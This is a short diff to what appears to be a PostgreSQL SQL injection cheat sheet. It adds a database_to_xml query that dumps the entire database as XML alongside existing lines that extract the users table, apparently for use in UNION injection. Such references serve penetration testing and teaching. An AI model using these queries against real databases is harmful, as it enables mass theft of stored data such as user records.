@@ -143,7 +143,10 @@ SELECT query_to_xml('SELECT * FROM users', true, true, '');
 -- Single table as XML
 SELECT table_to_xml('users', true, true, '');
 
--- Database structure as XML
+-- Entire database as XML (extracts all data - use with caution, large output)
+SELECT database_to_xml(true, true, '');
+
+-- Database schema/structure only (metadata, not data)
 SELECT database_to_xmlschema(true, true, '');
 
 -- In UNION injection
